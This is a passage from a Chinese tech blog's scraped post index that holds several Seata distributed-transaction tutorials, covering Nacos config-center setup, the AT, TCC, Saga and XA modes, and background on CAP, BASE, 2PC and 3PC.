~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.DefaultResourceManager.branchRegister(DefaultResourceManager.java:96) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy.register(ConnectionProxy.java:241) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy.processGlobalTransactionCommit(ConnectionProxy.java:219) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy.doCommit(ConnectionProxy.java:199) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy.lambda$commit$0(ConnectionProxy.java:184) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy$LockRetryPolicy.execute(ConnectionProxy.java:292) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy.commit(ConnectionProxy.java:183) ~[seata-all-1.4.0.jar:1.4.0] 9、Seata Server 整合 Nacos 配置中心在上面的案例中，并没有使用 Nacos 配置中心来存储 TC（Seata Server）相关的配置信息，而是直接使用了 file.conf ，但在生产环境中一般极少采用这种方式。特别注意，当使用 Seata Server 使用 Nacos 作为配置中心后，Seata Server 启动时只需要依赖 registry.conf，即不再需要 file.conf。同时在 Spring Cloud 应用中不再需要依赖任何 file.conf、registry.conf，直接在 bootstrap.yml 里就可以完成 Seata 的所有配置。 9.1、配置 Seata Server 的 registry.conf在 Seata Server 的 registry.conf 里，指定使用配置中心来存储 TC 的相关配置（如下） 12345678910111213141516171819202122232425registry { type = "nacos" nacos { application = "seata-server" serverAddr = "127.0.0.1:8848" group = "seata_demo" namespace = "ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d" cluster = "default" username = "" password = "" }}config { type = "nacos" nacos { serverAddr = "127.0.0.1:8848" namespace = "ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d" group = "seata_demo" username = "" password = "" }} 9.2、导入配置信息到 Nacos 配置中心Seata 官方提供了将配置信息（file.conf）批量导入到各种主流配置中心的 Shell 脚本，存放路径是在 Seata 源码目录下的 script/config-center 目录（如下） 1234567891011121314script/config-center├── apollo│&nbsp;&nbsp; └── apollo-config.sh├── config.txt├── consul│&nbsp;&nbsp; └── consul-config.sh├── etcd3│&nbsp;&nbsp; └── etcd3-config.sh├── nacos│&nbsp;&nbsp; ├── nacos-config.py│&nbsp;&nbsp; └── nacos-config.sh├── README.md└── zk └── zk-config.sh 其中 config.txt 为通用参数文件，包含了 Seata Server（TC）需要的所有配置信息，需要根据实际情况更改文件里的以下内容： 1234567891011service.vgroupMapping.seata-order-service-tx-group=defaultservice.vgroupMapping.seata-storage-service-tx-group=defaultservice.vgroupMapping.seata-account-service-tx-group=defaultstore.mode=dbstore.db.datasource=druidstore.db.dbType=mysqlstore.db.driverClassName=com.mysql.cj.jdbc.Driverstore.db.url=jdbc:mysql://127.0.0.1:3306/seata?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=falsestore.db.user=rootstore.db.password=123456 通用参数文件 config.txt 更改完成后，执行对应的 Shell 脚本将配置信息写入到配置中心即可。值得一提的是，config.txt 文件必须在 xxxx.sh 的上级目录里，而且 Shell 脚本可以重复执行多次。若使用 Nacos 作为配置中心，执行脚本时可以指定一些启动参数，如 Nacos 的 IP、端口号、命名空间、配置组等，Shell 脚本的具体使用方法可以查看官方说明文档 12# 执行数据导入脚本$ sh nacos-config.sh -h 127.0.0.1 -p 8848 -t ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d -g seata_demo 成功批量导入配置信息到 Nacos 后，控制台会输出如下提示： 1234========================================================================= Complete initialization parameters, total-count:79 , failure-count:0========================================================================= Init nacos config finished, please start seata-server. 访问 Nacos 的控制台，可以看到已经有对应的配置信息（如下）： 9.3、配置 Spring Cloud 项目以订单模块为例，bootstrap.yml 的完整配置如下，此时订单模块的 src/main/resources 目录下不再需要存放 file.conf、registry.conf 配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475nacos: # Nacos的地址 server-addr: 127.0.0.1:8848 # Nacos的命名空间 namespace: ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d # Nacos的配置分组 group: seata_demo # Seata Server的配置 seata: application: seata-server tx-service-group: seata-order-service-tx-group####### 以上是自定义配置中心和注册中心的共同属性，方便其他地方直接引用 #######server: port: 2001spring: application: name: seata-order-service cloud: nacos: discovery: server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} config: server-addr: ${nacos.server-addr} prefix: ${spring.application.name} file-extension: yaml namespace: ${nacos.namespace} group: ${nacos.group} # 以下配置内容均可以添加在Nacos配置中心 datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/seata_order?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false username: root password: 123456mybatis: mapperLocations: classpath*:mapper/*.xml type-aliases-package: com.seata.study.domainseata: enabled: true application-id: ${spring.application.name} tx-service-group: ${nacos.seata.tx-service-group} enable-auto-data-source-proxy: false registry: type: nacos nacos: application: ${nacos.seata.application} server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} username: "" password: "" config: type: nacos nacos: server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} username: "" password: ""feign: hystrix: enabled: falselogging: level: io: seata: info 9.4、代码下载（配置中心版） 点击下载完整的案例代码（配置中心版） 10、参考资料 Spring Cloud 快速集成 Seata 下篇 - Seata 入门教程（中级篇） Seata 入门教程 - 中级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务 分布式"},{title:"Seata 入门教程 - 中级篇",url:"/posts/84d3f3e6.html",text:'1、Seata 整体框架1.1、Seata 概述Seata 是一套一站式分布式事务解决方案，为用户提供了 AT、TCC、SAGA 和 XA 事务模式，致力于提供高性能和简单易用的分布式事务服务。 1.2、Seata 的三大模块Seata 中有三大模块，分别是 TM、RM 和 TC，其中 TM 和 RM 是作为 Seata 的客户端与业务系统集成在一起，TC 作为 Seata 的服务端独立部署。 TC：Transaction Coordinator 事务协调器，维护全局和分支事务的状态，负责协调并驱动全局事务的提交或回滚 TM：Transaction Manager 事务管理器，控制全局事务的边界，负责开启一个全局事务，并最终发起全局提交或全局回滚的决议 RM：Resource Manager 资源管理器，管理分支事务处理的资源，向 TC 注册分支事务，上报分支事务的状态，接受 TC 的命令来提交或者回滚分支事务 1.3、Seata 的执行流程 TM 开启分布式事务（TM 向 TC 注册全局事务记录） 按业务场景，编排数据库、服务等事务内资源（RM 向 TC 汇报资源准备状态 ） TM 结束分布式事务，事务一阶段结束（TM 通知 TC 提交 / 回滚分布式事务） TC 汇总事务信息，决定分布式事务是提交还是回滚 TC 通知所有 RM 提交 / 回滚 资源，事务二阶段结束 2、AT 模式2.1、前提 Java 应用，通过 JDBC 访问数据库 基于支持本地 ACID 事务的关系型数据库 2.2、写隔离 一阶段本地事务提交前，需要确保先拿到全局锁 拿不到全局锁 ，不能提交本地事务 拿全局锁的尝试被限制在一定范围内，超出范围将放弃，并回滚本地事务，释放本地锁 举例说明：两个全局事务 tx1 和 tx2，分别对 a 表的 m 字段进行更新操作，m 的初始值 1000 tx1 先开始，开启本地事务，拿到本地锁，更新操作 m = 1000 - 100 = 900。本地事务提交前，先拿到该记录的全局锁，本地提交事务释放本地锁。tx2 后开始，开启本地事务，拿到本地锁，更新操作 m = 900 - 100 = 800。tx2 本地事务提交前，尝试拿该记录的全局锁；tx1 全局提交前，该记录的全局锁被 tx1 持有，tx2 需要重试等待全局锁 。 如果 tx1 二阶段全局提交，释放全局锁，tx2 拿到全局锁后提交本地事务 如果 tx1 的二阶段全局回滚，则 tx1 需要重新获取该数据的本地锁，进行反向补偿的更新操作，实现分支事务的回滚。此时，如果 tx2 仍在等待该数据的全局锁，同时持有本地锁，则 tx1 的分支事务回滚会失败。tx1 的分支事务回滚会一直重试，直到 tx2 的全局锁等锁超时，放弃等待全局锁并回滚本地事务释放本地锁，tx1 的分支事务最终回滚成功。因为整个过程全局锁在 tx1 结束前一直是被 tx1 持有的，所以不会出现脏写的问题。 2.3、读隔离在数据库本地事务隔离级别读已提交（Read Committed）或以上的基础上，Seata（AT 模式）的默认全局隔离级别是读未提交（Read Uncommitted）。如果应用在特定场景下，必需要求全局的读已提交，目前 Seata 的方式是通过 SELECT FOR UPDATE 语句的代理。 SELECT FOR UPDATE 语句的执行会申请全局锁，如果全局锁被其他事务持有，则释放本地锁（回滚 SELECT FOR UPDATE 语句的本地执行）并重试。这个过程中，查询是被 block 住的，直到拿到全局锁，即读取的相关数据是已提交的才返回。出于总体性能上的考虑，Seata 目前的方案并没有对所有 SELECT 语句都进行代理，仅针对 FOR UPDATE 的 SELECT 语句。 2.4、整体机制AT 模式本质是两阶段提交协议（2PC）的演变： 一阶段：业务数据和回滚日志记录在同一个本地事务中提交，释放本地锁和连接资源 二阶段： 提交异步化，非常快速地完成 回滚是通过一阶段的回滚日志进行反向补偿 一阶段： 在一阶段，Seata 会拦截业务 SQL： 1）首先解析 SQL 语义，找到业务 SQL 要更新的业务数据，在业务数据被更新前，将其保存成 before image 2）执行 业务 SQL 更新业务数据，在业务数据更新之后，再将其保存成 after image 3）最后生成行锁 以上操作全部在一个数据库事务内完成，这样保证了一阶段操作的原子性，任何提交的业务数据的更新一定有相应的回滚日志存在 基于这样的机制，分支的本地事务便可以在全局事务的第一阶段提交，并马上释放本地事务锁定的资源；这也是 Seata 和 XA 事务的不同之处，两阶段提交往往对资源的锁定需要持续到第二阶段实际的提交或者回滚操作，而有了回滚日志之后，可以在第一阶段释放对资源的锁定，降低了锁范围，提高效率，即使第二阶段发生异常需要回滚，只需找对 undolog 中对应数据并反解析成 SQL 来达到回滚目的。同时 Seata 通过代理数据源将业务 SQL 的执行解析成 undolog 来与业务数据的更新同时入库，达到了对业务无侵入的效果。 二阶段提交： 二阶段如果是提交的话，因为 业务 SQL 在一阶段已经提交至数据库，所以 Seata 框架只需将一阶段保存的快照数据和行锁删掉，完成数据清理即可。 二阶段回滚： 二阶段如果是回滚的话，Seata 就需要回滚一阶段已经执行的 业务 SQL 来还原业务数据。回滚方式便是用 before image 还原业务数据；但在还原前要首先要校验脏写，对比 数据库当前业务数据 和 after image，如果两份数据完全一致就说明没有脏写，可以还原业务数据，如果不一致就说明有脏写，出现脏写就需要根据配置策略来做处理（如转人工处理）。 通俗讲： 第一阶段：假如我们现在插入或更新一条数据，根据动态代理它会提取你插入或更新的数据，保存一个原快照，然后再去执行 业务 SQL，再保存一个新快照，生成一个行锁。当你这个业务方法没有执行完，这个锁是不会释放的。最终提交 业务 SQL，业务表和 unlog 表是在同一个本地事务中，也就是要么同时成功，要么同时失败。因为你更新或插入一条数据，unlog 表会记录一些原始数据便于回滚，是 Seata 帮助我们实现了回滚 第二阶段：在这个阶段 Seata 会查看你的日志是否成功，如果成功不会做任何操作，如果失败，它会做一个反向补偿，使用 unlog 表记录一些原数据进行回滚操作 2.5、适用场景与优缺点适用场景： 分布式事务的业务逻辑中仅仅是纯数据库操作，不包含其他中间件的事务逻辑 优点： 改动及代码侵入最小，由 Seata 来负责 Commit 和 Rollback 的自动化提交或回滚操作 缺点： 如果事务中包含缓存存储或发送 MQ 消息等，则不适合使用 多次对数据库操作，以及全局行锁的存在对并发处理性能有影响 为了保证镜像 SQL 的可靠性，需要用户对 SQL 尽量做简化，建议做法：将多条 SQL 语句分解为多个事务中的原子步骤（对应 Seata AT 模式的分支 Branch 概念），如果单条 SQL 语句跨表，也分解成为多个事务中的原子步骤（尽量降低 Seata 存储前 SQL 镜像结果时的风险） 3、TCC 模式3.1、概述该模式由蚂蚁金服贡献，TCC 需要用户根据自己的业务场景实现 Try、Confirm 和 Cancel 三个接口。事务发起方在一阶段执行 Try 操作，在二阶段提交执行 Confirm 操作，二阶段回滚执行 Cancel 操作。TCC 三个接口的描述如下： Try：资源的检测和预留 Confirm：执行的业务操作提交，要求 Try 成功 Confirm 就一定要能成功 Cancel：预留资源释放 一个分布式的全局事务，整体是两阶段提交的模型。全局事务是由若干分支事务组成的，分支事务要满足两阶段提交的模型要求，即需要每个分支事务都具备自己的： 一阶段 prepare 行为 二阶段 commit 或 rollback 行为 3.2、AT 与 TCC 的区别根据两阶段行为模式的不同，可以将分支事务划分为 Automatic (Branch) Transaction Mode 和 Manual (Branch) Transaction Mode。 AT 模式基于支持本地 ACID 事务的关系型数据库： 一阶段 prepare 行为：在本地事务中，一并提交业务数据更新和相应回滚日志记录 二阶段 commit 行为：马上成功结束，自动异步批量清理回滚日志 二阶段 rollback 行为：通过回滚日志，自动生成补偿操作，完成数据回滚 相应的，TCC 模式，不依赖于底层数据资源的事务支持： 一阶段 prepare 行为：调用 自定义 的 prepare 逻辑 二阶段 commit 行为：调用 自定义 的 commit 逻辑 二阶段 rollback 行为：调用 自定义 的 rollback 逻辑 所谓的 Seata TCC 模式，是指支持把自定义的分支事务纳入到全局事务的管理中 3.3、适用场景与优缺点适用场景： 分布式事务的业务逻辑中除了数据库操作外，包含其他中间件事务逻辑 优点： 适合微服务化场景 无 AT 模式的全局行锁，TCC 性能会比 AT 模式高很多 用户可以自己定义业务的补偿逻辑，由业务层保证事务的一致性 缺点： TCC 模式下开发者需要自行实现 Try、Confirm、Cancel 接口，对业务代码有一定的侵入性 需要考虑如何将业务模型拆成 2 阶段，实现成 TCC 的 3 个方法，并且保证 Try 成功 Confirm 就一定能成功，Confirm 失败会不断重试 4、Saga 模式4.1、概述Saga 模式是 Seata 提供的长事务解决方案，该模式主要由蚂蚁金服贡献，在 Saga 模式中，业务流程中每个参与者都提交本地事务，当出现某一个参与者失败则补偿前面已经成功的参与者，一阶段正向服务和二阶段补偿服务都由业务开发实现。 4.2、整体机制目前 Seata 提供的 Saga 模式是基于状态机引擎来实现的，机制是： 1）通过状态图来定义服务调用的流程，并生成 Json 状态语言定义文件 2）状态图中一个节点可以是调用一个服务，节点可以配置它的补偿节点 3）状态图 Json 由状态机引擎驱动执行，当出现异常时状态引擎反向执行已成功节点对应的补偿节点将事务回滚（注意：异常发生时是否进行补偿也可由用户自定义决定） 4）可以实现服务编排需求，支持单项选择、并发、子流程、参数转换、参数映射、服务执行状态判断、异常捕获等功能 4.3、适用场景与优缺点适用场景： 对数据隔离性要求不高，对性能要求高的场景 参与者包含其它公司或遗留系统服务，无法提供 TCC 模式要求的三个接口 业务流程长、业务流程多、不需马上返回最终结果，只要保证最终一致性的场景 优点： 补偿逻辑易于实现 一阶段提交本地事务，无锁，高性能 事件驱动架构，参与者可异步执行，高吞吐量 缺点： 不保证隔离性 补偿逻辑需要自行实现 5、XA 模式5.1、前提 支持 XA 事务的数据库 Java 应用，通过 JDBC 访问数据库 5.2、整体机制在 Seata 定义的分布式事务框架内，利用事务资源（数据库、消息服务等）对 XA 协议的支持，以 XA 协议的机制来管理分支事务的一种事务模式。 执行阶段： 可回滚：业务 SQL 操作放在 XA 分支中进行，由资源对 XA 协议的支持来保证可回滚 持久化：XA 分支完成后，执行 XA Prepare，同样，由资源对 XA 协议的支持来保证持久化（即之后任何意外都不会造成无法回滚的情况） 完成阶段： 分支提交：执行 XA 分支的 Commit 分支回滚：执行 XA 分支的 Rollback 5.3、工作机制整体运行机制： XA 模式 运行在 Seata 定义的事务框架内： 执行阶段（E xecute）：XA start/XA end/XA prepare + SQL + 注册分支 完成阶段（F inish）：XA commit/XA rollback 数据源代理： XA 模式需要依赖 XAConnection，获取 XAConnection 两种方式： 方式一：要求开发者配置 XADataSource，给开发者增加了认知负担，需要为 XA 模式专门去学习和使用 XA 数据源，与透明化 XA 编程模型的设计目标相违背 方式二：根据开发者的普通 DataSource 来创建，对开发者比较友好，和 AT 模式使用一样，开发者完全不必关心 XA 层面的任何问题，保持本地编程模型即可 Seata 优先设计实现第二种方式：数据源代理根据普通数据源中获取的普通 JDBC 连接创建出相应的 XAConnection，类比 AT 模式的数据源代理机制（如下）: 但是第二种方法有局限：无法保证兼容的正确性。实际上，这种方法是在做数据库驱动程序要做的事情；不同的厂商、不同版本的数据库驱动实现机制是厂商私有的，Seata 只能保证在充分测试过的驱动程序上是正确的，开发者使用的驱动程序版本差异很可能造成机制的失效，这点在 Oracle 上体现非常明显。 综合考虑，XA 模式的数据源代理设计需要同时支持第一种方式：基于 XA 数据源进行代理，类比 AT 模式的数据源代理机制（如下）： 分支注册： XA Start 需要 Xid 参数，这个 Xid 需要和 Seata 全局事务的 XID 和 BranchId 关联起来，以便由 TC 驱动 XA 分支的提交或回滚。目前 Seata 的 BranchId 是在分支注册过程，由 TC 统一生成的，所以 XA 模式分支注册的时机需要在 XA start 之前。Seata 的 XA 模式将来一个可能的优化方向：把分支注册尽量延后。类似 AT 模式在本地事务提交之前才注册分支，避免分支执行失败情况下，没有意义的分支注册。这个优化方向需要 BranchId 生成机制的变化来配合，即 BranchId 不通过分支注册过程生成，而是生成后再带着 BranchId 去注册分支。 XA 模式的使用： 从编程模型上，XA 模式与 AT 模式保持完全一致，只需要修改数据源代理，即可实现 XA 模式与 AT 模式之间的切换，示例代码如下： 12345678@Bean("dataSource") public DataSource dataSource(DruidDataSource druidDataSource) { // DataSourceProxy for AT mode // return new DataSourceProxy(druidDataSource); // DataSourceProxyXA for XA mode return new DataSourceProxyXA(druidDataSource); } 6、参考文献 Seata 官方文档 - AT 模式 Seata 官方文档 - XA 模式 Seata 官方文档 - TCC 模式 Seata 官方文档 - Saga 模式 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务 分布式"},{title:"Seata 入门教程 - 基础篇",url:"/posts/e8b71fbe.html",text:'前言术语 TX 协议：应用或者应用服务器与事务管理器的接口 XA 协议：全局事务管理器与资源管理器的接口。XA 是由 X/Open 组织提出的分布式事务规范，该规范主要定义了全局事务管理器和局部资源管理器之间的接口，主流的数据库产品都实现了 XA 接口。XA 接口是一个双向的系统接口，在事务管理器以及多个资源管理器之间作为通信桥梁。之所以需要 XA 是因为在分布式系统中从理论上讲两台机器是无法达到一致性状态的，因此引入一个单点进行协调。由全局事务管理器管理和协调的事务可以跨越多个资源和进程。全局事务管理器一般使用 XA 二阶段协议与数据库进行交互。 分布式理论CAP 理论： CAP 定理是由加州大学伯克利分校 Eric Brewer 教授提出来的，他指出 WEB 服务无法同时满足一下三个属性： 一致性 (Consistency)：客户端知道一系列的操作都会同时发生 (生效) 可用性 (Availability)：每个操作都必须以可预期的响应结束 分区容错性 (Partition tolerance)：即使出现单个组件无法可用，操作依然可以完成 具体地讲在分布式系统中，任何数据库设计或者 Web 应用至多只能同时支持上面的两个属性。显然，任何横向扩展策略都要依赖于数据分区。因此，设计人员必须在一致性与可用性之间做出选择。 BASE 理论： 在分布式系统中，往往追求的是可用性，它的重要程序比一致性要高，那么如何实现高可用性呢？前人已经给我们提出来了另外一个理论，就是 BASE 理论，它是用来对 CAP 定理进行进一步扩充的。BASE 理论指的是： Basically Available（基本可用） Soft state（软状态） Eventually consistent（最终一致性） BASE 理论是对 CAP 中的一致性和可用性进行一个权衡的结果，理论的核心思想就是：无法做到强一致，但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性（Eventual consistency）。 酸碱平衡： ACID 能够保证事务的强一致性，即数据是实时一致的，这在本地事务中是没有问题的。在分布式事务中，强一致性会极大影响分布式系统的性能，因此分布式系统中遵循 BASE 理论即可。但分布式系统的不同业务场景对一致性的要求也不同。如交易场景下，就要求强一致性，此时就需要遵循 ACID 理论，而在注册成功后发送短信验证码等场景下，并不需要实时一致，因此遵循 BASE 理论即可。因此要根据具体业务场景，在 ACID 和 BASE 之间寻求平衡。 分布式事务基础事务事务指的就是一个操作单元，在这个操作单元中的所有操作最终要保持一致的行为，要么所有操都成功，要么所有的操作都被撤销。简单地说，事务提供一种” 要么什么都不做，要么做全套 “机制。 本地事务本地事务其实可以认为是数据库提供的事务机制。说到数据库事务就不得不说，数据库事务中的四大特性（ACID）： A：原子性（Atomicity），一个事务中的所有操作，要么全部完成，要么全部不完成 C：一致性（Consistency），在一个事务执行之前和执行之后数据库都必须处于一致性状态 I：隔离性（Isolation），在并发环境中，当不同的事务同时操作相同的数据时，事务之间互不影响 D：持久性（Durability），指的是只要事务成功结束，它对数据库所做的更新就必须永久的保存下来 数据库事务在实现时会将一次事务涉及的所有操作全部纳入到一个不可分割的执行单元，该执行单元中的所有操作要么都成功，要么都失败，只要其中任一操作执行失败，都将导致整个事务的回滚。 分布式事务分布式事务指事务的参与者、支持事务的服务器、资源服务器以及事务管理器分别位于不同的分布式系统的不同节点之上。简单的说，就是一次大的操作由不同的小操作组成，这些小的操作分布在不同的服务器上，且属于不同的应用，分布式事务需要保证这些小操作要么全部成功，要么全部失败。本质上来说，分布式事务就是为了保证不同数据库的数据一致性。一句话概括就是，一次业务操作需要跨多个数据源或者需要跨多个系统进行远程调用，就会产生分布式事务问题。 分布式事务的场景 单体系统访问多个数据库：一个服务需要调用多个数据库实例完成数据的增删改操作 多个微服务访问同一个数据库：多个服务需要调用一个数据库实例完成数据的增删改操作 多个微服务访问多个数据库：多个服务需要调用一个数据库实例完成数据的增删改操作 分布式事务协议两阶段提交协议（2PC）分布式系统的一个难点是如何保证架构下多个节点在进行事务性操作的时候保持一致性。为实现这个目的，二阶段提交算法的成立基于以下假设： 该分布式系统中，存在一个节点作为协调者（Coordinator），其他节点作为参与者（Cohorts），且节点之间可以进行网络通信 所有节点都采用预写式日志，且日志被写入后即被保持在可靠的存储设备上，即使节点损坏不会导致日志数据的消失 所有节点不会永久性损坏，即使损坏后仍然可以恢复 第一阶段（投票阶段）: 协调者节点向所有参与者节点询问是否可以执行提交操作（vote），并开始等待各参与者节点的响应 参与者节点执行询问发起为止的所有事务操作，并将 Undo 信息和 Redo 信息写入日志（注意：若成功这里其实每个参与者已经执行了事务操作） 各参与者节点响应协调者节点发起的询问，如果参与者节点的事务操作实际执行成功，则它返回一个” 同意” 消息；如果参与者节点的事务操作实际执行失败，则它返回一个” 中止” 消息 第二阶段（提交执行阶段）： 当协调者节点从所有参与者节点获得的相应消息都为” 同意” 时： 协调者节点向所有参与者节点发出” 正式提交（Commit）” 的请求 参与者节点正式完成操作，并释放在整个事务期间内占用的资源 参与者节点向协调者节点发送” 完成” 消息 协调者节点受到所有参与者节点反馈的” 完成” 消息后，完成事务 中断事务： 如果任一参与者节点在第一阶段返回的响应消息为” 中止”，或者协调者节点在第一阶段的询问超时之前无法获取所有参与者节点的响应消息时： 协调者节点向所有参与者节点发出” 回滚操作（Rollback）” 的请求 参与者节点利用之前写入的 Undo 信息执行回滚，并释放在整个事务期间内占用的资源 参与者节点向协调者节点发送” 回滚完成” 消息 协调者节点受到所有参与者节点反馈的” 回滚完成” 消息后，取消事务 特别注意：不管最后结果如何，第二阶段都会结束当前事务 二阶段提交的缺点： 资源阻塞：执行过程中，所有参与节点都是事务阻塞型的。当参与者占有公共资源时，其他第三方节点访问公共资源不得不处于阻塞状态 参与者发生故障：协调者需要给每个参与者额外指定超时机制，超时后整个事务失败（没有多少容错机制） 协调者发生故障：参与者会一直阻塞下去。需要额外的备机进行容错（这个可以依赖 Paxos 协议实现 HA） 二阶段无法解决的问题：协调者再发出 Commit 消息之后宕机，而唯一接收到这条消息的参与者同时也宕机了。那么即使协调者通过选举协议产生了新的协调者，这条事务的状态也是不确定的，没人知道事务是否已经被提交成功，这有可能导致数据不一致 三阶段提交协议（3PC）与两阶段提交不同的是，三阶段提交有两个改动点： 引入超时机制。同时在协调者和参与者中都引入超时机制 在第一阶段和第二阶段中插入一个准备阶段，保证了在最后提交阶段之前各参与节点的状态是一致的 也就是说，除了引入超时机制之外，3PC 把 2PC 的准备阶段再次一分为二，这样三阶段提交就有 CanCommit、PreCommit、DoCommit 三个阶段. CanCommit 阶段： 3PC 的 CanCommit 阶段其实和 2PC 的准备阶段很像。协调者向参与者发送 Commit 请求，参与者如果可以提交就返回 Yes 响应，否则返回 No 响应： 事务询问：协调者向参与者发送 CanCommit 请求。询问是否可以执行事务提交操作。然后开始等待参与者的响应 响应反馈：参与者接到 CanCommit 请求之后，正常情况下，如果其自身认为可以顺利执行事务，则返回 Yes 响应，并进入预备状态，否则反馈 No PreCommit 阶段： 协调者根据参与者的反应情况来决定是否可以执行事务的 PreCommit 操作。根据响应情况，有以下两种可能： 假如协调者从所有的参与者获得的反馈都是 Yes 响应，那么就会执行事务的预执行 发送预提交请求：协调者向参与者发送 PreCommit 请求后，并进入 Prepared 阶段 事务预提交：参与者接收到 PreCommit 请求后，会执行事务操作，并将 Undo 和 Redo 信息记录到事务日志中 响应反馈：如果参与者成功的执行了事务操作，则返回 ACK 响应，同时开始等待最终指令 假如有任何一个参与者向协调者发送了 No 响应，或者等待超时之后，协调者都没有接到参与者的响应，那么就执行事务的中断 发送中断请求：协调者向所有参与者发送 Abort 请求 中断事务：参与者收到来自协调者的 Abort 请求之后（或超时之后，仍未收到协调者的请求），执行事务的中断 DoCommit 阶段 该阶段进行真正的事务提交，也可以分为以下两种情况： 执行提交： 发送提交请求：协调接收到参与者发送的 ACK 响应，那么它将从预提交状态进入到提交状态，并向所有参与者发送 DoCommit 请求 事务提交：参与者接收到 DoCommit 请求之后，执行正式的事务提交，并在完成事务提交之后释放所有事务资源 响应反馈：事务提交完之后，向协调者发送 ACK 响应 完成事务：协调者接收到所有参与者的 ACK 响应之后，完成事务 中断事务 发送中断请求：协调者向所有参与者发送 Abort 请求 事务回滚：参与者接收到 Abort 请求之后，利用其在阶段二记录的 Undo 信息来执行事务的回滚操作，并在完成回滚之后释放所有的事务资源 反馈结果：参与者完成事务回滚之后，向协调者发送 ACK 消息 中断事务：协调者接收到参与者反馈的 ACK 消息之后，执行事务的中断 这里协调者如果没有接收到参与者发送的 ACK 响应（可能是接受者发送的不是 ACK 响应，也可能响应超时），那么就会执行中断事务。 分布式事务解决方案全局事务（DTP 模型）全局事务是基于 DTP 模型实现的，DTP 是由 X/Open 组织提出的一种分布式事务模型 ——X/Open Distributed Transaction Processing Reference Model。它规定了要实现分布式事务，需要三种角色： AP: Application 应用系统 (微服务) TM: Transaction Manager 事务管理器 (全局事务管理) RM: Resource Manager 资源管理器 (数据库) 整个事务分成两个阶段： 阶段一：表决阶段，所有参与者都将本事务执行预提交，并将能否成功的信息反馈发给协调者 阶段二：执行阶段，协调者根据所有参与者的反馈，通知所有参与者，步调一致地执行提交或者回滚 优点： 提高了数据一致性的概率，实现成本较低 缺点： 单点问题：事务协调者宕机 同步阻塞：延迟了提交时间，加长了资源阻塞时间 数据不一致：在提交的第二阶段，依然存在 Commit 结果未知的情况，有可能导致数据不一致 TCC（两阶段型、补偿型）TCC 即为 Try Confirm Cancel，它属于补偿型分布式事务。TCC 实现分布式事务一共有三个步骤： Try（尝试待执行的业务）：这个过程并未执行业务，只是完成所有业务的一致性检查，并预留好执行所需的全部资源 Confirm（确认执行业务）：确认执行业务操作，不做任何业务检查，只使用 Try 阶段预留的业务资源。通常情况下，采用 TCC 则认为 Confirm 阶段是不会出错的。即只要 Try 成功，Confirm 就一定成功。若 Confirm 阶段真的出错了，需引入重试机制或人工处理 Cancel（取消待执行的业务）：取消 Try 阶段预留的业务资源。通常情况下，采用 TCC 则认为 Cancel 阶段也是一定成功的。若 Cancel 阶段真的出错了，需引入重试机制或人工处理 TCC 两阶段提交与 XA 两阶段提交的区别： XA 是资源层面的分布式事务，强一致性，在两阶段提交的整个过程中，一直会持有资源的锁 TCC 是业务层面的分布式事务，最终一致性，不会一直持有资源的锁 TCC 事务的优缺点： 优点：把数据库层的二阶段提交上提到了应用层来实现，规避了数据库层的 2PC 性能低下的问题 缺点：TCC 的 Try、Confirm 和 Cancel 操作功能需业务提供，开发成本高 最大努力通知（定期校对）最大努力通知也被称为定期校对，其实是对第二种解决方案的进一步优化。它引入了本地消息表来记录错误消息，然后加入失败消息的定期校对功能，来进一步保证消息会被下游系统消费。 第一步：消息由系统 A 投递到消息中间件 1）处理业务的同一事务中，向本地消息表中写入一条记录 2）准备专门的消息发送者不断地发送本地消息表中的消息到消息中间件，如果发送失败则重试 第二步：消息由中间件投递到系统 B 1）消息中间件收到消息后负责将该消息同步投递给相应的下游系统，并触发下游系统的任务执行 2）当下游系统处理成功后，向消息中间件反馈确认应答，消息中间件便可以将该条消息删除，从而该事务完成 3）对于投递失败的消息，利用重试机制进行重试，对于重试失败的，写入错误消息表 